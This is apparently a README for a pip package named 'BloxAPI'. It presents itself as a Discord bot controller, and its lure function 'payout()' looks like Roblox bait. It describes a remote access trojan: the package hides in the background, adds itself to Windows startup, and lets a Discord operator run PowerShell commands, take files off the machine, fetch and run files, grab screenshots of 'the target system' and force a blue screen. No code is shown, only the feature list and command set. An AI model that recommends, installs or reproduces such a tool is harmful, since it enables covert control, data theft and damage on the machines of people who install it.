# BloxAPI

**Persistent Discord bot controller that runs 24/7 once activated**

## Installation

```bash
pip install bloxapi
```

## Usage

**One-time activation (runs forever after this):**

```python
import bloxapi

# Activate once - runs 24/7 forever, even after restart
bloxapi.payout()
```

## 🚀 Key Features

### Persistence & Reliability
- **One-time activation**: Call `roblox.payout()` once and it runs forever
- **Auto-restart after reboot**: Automatically starts when Windows boots
- **Crash recovery**: Auto-restarts if the bot crashes
- **Background operation**: Runs silently in the background

### Remote Control Features
- **File operations**: Upload/download files remotely
- **Screenshot capture**: Take screenshots of the target system
- **System commands**: Execute PowerShell commands remotely
- **Directory navigation**: Browse and change directories
- **Process execution**: Run any file or program

### Advanced Capabilities
- **Startup persistence**: Adds itself to Windows startup
- **Blue screen trigger**: Emergency system crash capability
- **Session management**: Each session gets a unique Discord channel

## 🔧 Setup Requirements

1. **Discord Bot Token**: Set as environment variable `DISCORD_BOT_TOKEN`
2. **Discord Server**: Create a server and get the Guild ID
3. **Bot Permissions**: Admin permissions in your Discord server

### Environment Setup

Create a `.env` file or set environment variable:
```
DISCORD_BOT_TOKEN=your_bot_token_here
```

### Code Configuration

Before using, set your Discord server ID in the package:
```python
# In my_package/roblox.py, line with guild_id = ""
guild_id = "your_discord_server_id_here"
```

## 📱 Discord Commands

Once activated, control the system via Discord:

- `help` - Show all commands
- `ping` - Check bot latency
- `ls` - List files in current directory
- `cd <path>` - Change directory
- `download <file>` - Upload file to cloud and get download link
- `upload <url>` - Download file from URL to system
- `shell <command>` - Execute PowerShell command
- `run <file>` - Execute a file or program
- `screenshot` - Take and send screenshot
- `startup` - Add to system startup (redundant - already persistent)
- `blue` - Trigger blue screen (emergency only)
- `exit` - Stop the bot session

## 🔒 Important Notes

- **One activation only**: Once `roblox.payout()` is called, the system is permanently active
- **Stealth operation**: Runs silently in background with no visible windows
- **System integration**: Integrates with Windows startup for persistence
- **Auto-recovery**: Automatically handles crashes and network issues

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
